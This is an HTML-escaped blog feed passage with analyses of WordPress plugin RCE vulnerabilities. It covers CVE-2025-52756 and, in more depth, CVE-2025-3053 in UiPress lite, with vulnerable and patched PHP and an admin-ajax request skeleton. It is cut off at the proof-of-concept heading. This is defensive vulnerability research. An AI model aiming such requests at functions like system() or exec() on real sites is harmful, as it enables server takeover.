src=&#39;http://localhost:1313/posts/2025-12-02-cve-2025-52756/result.png&#39; alt=&#34;Result&#34; height=&#34;808&#34; width=&#34;1237&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability in &lt;strong&gt;WP Last Modified Info &amp;lt;= 1.9.4&lt;/strong&gt; allows a &lt;strong&gt;Contributor&lt;/strong&gt; to inject a shortcode containing an arbitrary PHP function name in &lt;code&gt;hide_archive&lt;/code&gt;. These functions are checked with &lt;code&gt;is_callable()&lt;/code&gt; and then directly executed, leading to &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;. Version &lt;strong&gt;1.9.5&lt;/strong&gt; mitigates this by restricting calls to a predefined whitelist of safe functions.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Never call functions directly from user input, even when using &lt;code&gt;is_callable()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;If dynamic callbacks are required, always use a &lt;strong&gt;whitelist&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Shortcodes are a potential attack surface and must be carefully validated and permission-controlled.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wp-last-modified-info/vulnerability/wordpress-wp-last-modified-info-plugin-1-9-2-remote-code-execution-rce-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Last Modified Info Plugin &amp;lt;= 1.9.4 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-3053 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-01-cve-2025-3053/</link>
      <pubDate>Mon, 01 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-01-cve-2025-3053/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-01-cve-2025-3053/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;UiPress lite&lt;/strong&gt; | a plugin for easily creating &lt;strong&gt;custom dashboards&lt;/strong&gt;, &lt;strong&gt;admin themes&lt;/strong&gt;, and &lt;strong&gt;pages&lt;/strong&gt; for &lt;strong&gt;WordPress&lt;/strong&gt; contains a &lt;strong&gt;Remote Code Execution&lt;/strong&gt; vulnerability in all versions up to and including &lt;strong&gt;3.5.07&lt;/strong&gt; via the &lt;strong&gt;uip_process_form_input()&lt;/strong&gt; function. This is because the function takes &lt;strong&gt;user-supplied input&lt;/strong&gt; to execute &lt;strong&gt;arbitrary functions&lt;/strong&gt; with &lt;strong&gt;arbitrary data&lt;/strong&gt; and &lt;strong&gt;does not perform any capability checks&lt;/strong&gt;. This allows &lt;strong&gt;authenticated attackers&lt;/strong&gt;, with &lt;strong&gt;Subscriber-level&lt;/strong&gt; access or higher, to &lt;strong&gt;execute arbitrary code&lt;/strong&gt; on the &lt;strong&gt;server&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-3053&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-3053&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.5.07&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.5.08&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (8.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/uipress-lite/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress UiPress lite Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version – UiPress lite&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.5.07&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.5.08&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v3.5.07):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function uip_process_form_input()&#xA;{&#xA;    // Check security nonce and &amp;#39;DOING_AJAX&amp;#39; global&#xA;    Ajax::check_referer();&#xA;&#xA;    $data = json_decode(stripslashes($_POST[&amp;#34;formData&amp;#34;]));&#xA;    $data = Sanitize::clean_input_with_code($data);&#xA;&#xA;    $userFunction = sanitize_text_field($_POST[&amp;#34;userFunction&amp;#34;]);&#xA;&#xA;    if (!function_exists($userFunction)) {&#xA;        Ajax::error(__(&amp;#39;Passed function doesn\&amp;#39;t exist&amp;#39;, &amp;#34;uipress-lite&amp;#34;));&#xA;    }&#xA;&#xA;    // Try to start user supplied function&#xA;    try {&#xA;        $userFunction($data);&#xA;    } catch (Exception $e) {&#xA;        // Catch function error&#xA;        Ajax::error($e-&amp;gt;getMessage());&#xA;    }&#xA;&#xA;    $returndata = [];&#xA;    $returndata[&amp;#34;success&amp;#34;] = true;&#xA;    wp_send_json($returndata);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;uip_process_form_input()&lt;/code&gt; function is triggered via AJAX and relies only on &lt;code&gt;Ajax::check_referer()&lt;/code&gt; to verify the nonce and confirm the request is running in the &lt;code&gt;DOING_AJAX&lt;/code&gt; context. This mechanism &lt;strong&gt;does not check the user’s capability&lt;/strong&gt; with functions like &lt;code&gt;current_user_can()&lt;/code&gt;, but only validates the request. As a result, any authenticated user (Subscriber and above) can specify any valid PHP function → leading to &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function check_referer()&#xA;{&#xA;    $doingAjax = defined(&amp;#34;DOING_AJAX&amp;#34;) &amp;amp;&amp;amp; DOING_AJAX ? true : false;&#xA;    $referer = check_ajax_referer(&amp;#34;uip-security-nonce&amp;#34;, &amp;#34;security&amp;#34;) &amp;gt; 0 ? true : false;&#xA;    $result = $doingAjax &amp;amp;&amp;amp; $referer ? true : false;&#xA;&#xA;    // Abort if not doing ajax or bad referer&#xA;    if (!$result) {&#xA;        $message = __(&amp;#34;Unable to perform action&amp;#34;, &amp;#34;uipress-lite&amp;#34;);&#xA;        self::error($message);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Data from &lt;code&gt;$_POST[&amp;quot;formData&amp;quot;]&lt;/code&gt; is processed with &lt;code&gt;stripslashes()&lt;/code&gt; and then passed into &lt;code&gt;json_decode()&lt;/code&gt;, so &lt;code&gt;$data&lt;/code&gt; is usually a &lt;strong&gt;&lt;code&gt;stdClass&lt;/code&gt;&lt;/strong&gt; (or the corresponding data type based on the JSON content). This value is then passed through &lt;code&gt;Sanitize::clean_input_with_code()&lt;/code&gt;, which may filter data, but &lt;strong&gt;does not control function execution&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Tip&lt;/p&gt;&lt;p&gt;If &lt;code&gt;$_POST[&amp;quot;formData&amp;quot;]&lt;/code&gt; is sent as a plain string instead of JSON (&amp;quot;{}&amp;quot;), &lt;code&gt;json_decode()&lt;/code&gt; will return a string instead of a &lt;strong&gt;&lt;code&gt;stdClass&lt;/code&gt;&lt;/strong&gt;. This allows full control over &lt;code&gt;$data&lt;/code&gt;.&lt;/p&gt;&lt;/div&gt;&lt;p&gt;Next, the function name is taken from &lt;code&gt;$_POST[&amp;quot;userFunction&amp;quot;]&lt;/code&gt; and only checked using &lt;code&gt;function_exists()&lt;/code&gt;. This means &lt;strong&gt;any valid PHP function existing in the WordPress/PHP environment can be called&lt;/strong&gt;, as long as the attacker knows or guesses its name.&lt;/p&gt;&#xA;&lt;p&gt;Finally, the line &lt;code&gt;$userFunction($data);&lt;/code&gt; performs a &lt;strong&gt;dynamic function call&lt;/strong&gt; with user-controlled data. Allowing users to directly control the function name without a whitelist or permission checks creates a &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt; vulnerability, or at minimum an &lt;strong&gt;Arbitrary Function Call&lt;/strong&gt;, enabling authenticated attackers (e.g., Subscribers) to invoke dangerous functions such as &lt;code&gt;system()&lt;/code&gt;, &lt;code&gt;exec()&lt;/code&gt;, &lt;code&gt;shell_exec()&lt;/code&gt;, &lt;code&gt;eval()&lt;/code&gt;, etc., resulting in command execution or system manipulation.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patch (v3.5.08):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function uip_process_form_input()&#xA;{&#xA;    // Check security nonce and &amp;#39;DOING_AJAX&amp;#39; global&#xA;    Ajax::check_referer();&#xA;&#xA;    Ajax::error(__(&amp;#34;Passing form data to user specified functions has been disabled to prevent potential security issues.&amp;#34;, &amp;#34;uipress-lite&amp;#34;));&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch effectively fixes the issue by removing the original logic entirely :)).&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-01-cve-2025-3053/diff.png&#34; title=&#34;Changes introduced in the patch&#34; data-thumbnail=&#34;/posts/2025-12-01-cve-2025-3053/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Changes introduced in the patch&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-01-cve-2025-3053/diff.png&#39; alt=&#34;Diff&#34; height=&#34;583&#34; width=&#34;1894&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Changes introduced in the patch&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;public function load_ajax()&#xA;{&#xA;    $function_names = [&#xA;        &amp;#34;uip_get_users_and_roles&amp;#34;,&#xA;        &amp;#34;uip_get_post_types&amp;#34;,&#xA;        &amp;#34;uip_get_recent_posts&amp;#34;,&#xA;        &amp;#34;uip_get_posts_for_table&amp;#34;,&#xA;        &amp;#34;uip_get_post_table_columns&amp;#34;,&#xA;        &amp;#34;uip_delete_post&amp;#34;,&#xA;        &amp;#34;uip_save_user_preference&amp;#34;,&#xA;        &amp;#34;uip_get_user_preference&amp;#34;,&#xA;        &amp;#34;uip_search_content&amp;#34;,&#xA;        &amp;#34;uip_process_form_input&amp;#34;,&#xA;        &amp;#34;uip_send_form_email&amp;#34;,&#xA;        &amp;#34;uip_save_form_as_option&amp;#34;,&#xA;        &amp;#34;uip_save_form_as_user_option&amp;#34;,&#xA;        &amp;#34;uip_pre_populate_form_data&amp;#34;,&#xA;        &amp;#34;uip_create_frame_switch&amp;#34;,&#xA;        &amp;#34;uip_get_sync_options&amp;#34;,&#xA;        &amp;#34;uip_refresh_sync_key&amp;#34;,&#xA;        &amp;#34;uip_save_sync_options&amp;#34;,&#xA;        &amp;#34;uip_start_site_sync&amp;#34;,&#xA;        &amp;#34;uip_check_for_template_updates&amp;#34;,&#xA;        &amp;#34;uip_process_block_query&amp;#34;,&#xA;        &amp;#34;uip_save_site_option&amp;#34;,&#xA;        &amp;#34;uip_send_message_to_gpt&amp;#34;,&#xA;        &amp;#34;uip_global_export&amp;#34;,&#xA;        &amp;#34;uip_global_import&amp;#34;,&#xA;        &amp;#34;uip_push_new_custom_menu_items&amp;#34;,&#xA;        &amp;#34;uip_remove_custom_menu_items&amp;#34;,&#xA;    ];&#xA;&#xA;    // Push ajax actions&#xA;    foreach ($function_names as $name) {&#xA;        add_action(&amp;#34;wp_ajax_{$name}&amp;#34;, [$this, $name]);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The plugin registers multiple AJAX actions via the &lt;code&gt;load_ajax()&lt;/code&gt; function. Each name in the &lt;code&gt;$function_names&lt;/code&gt; array is hooked using &lt;code&gt;add_action(&amp;quot;wp_ajax_{$name}&amp;quot;, [$this, $name])&lt;/code&gt;. This means that when a request is sent to &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with &lt;code&gt;action = $name&lt;/code&gt;, WordPress will directly invoke the method with the same name in the plugin’s class.&lt;/p&gt;&#xA;&lt;p&gt;Since &lt;code&gt;uip_process_form_input&lt;/code&gt; is in the list, a request such as:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php&#xA;action=uip_process_form_input&amp;amp;security=...&amp;amp;formData=...&amp;amp;userFunction=...&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;will trigger &lt;code&gt;uip_process_form_input()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;POST /wp-admin/admin-ajax.php...action=uip_process_form_input&amp;#34;] --&amp;gt; B[&amp;#34;WordPress calls uip_process_form_input()&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;Ajax::check_referer()&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;$data = json_decode(formData)&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;$userFunction = sanitize_text_field(userFunction)&amp;#34;]&#xA;E --&amp;gt; F{&amp;#34;function_exists($userFunction)?&amp;#34;}&#xA;F --&amp;gt;|Yes| G[&amp;#34;$userFunction($data)&amp;#34;]&#xA;F --&amp;gt;|No| H[&amp;#34;Ajax::error()&amp;#34;]&#xA;G --&amp;gt; I[&amp;#34;wp_send_json(success)&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 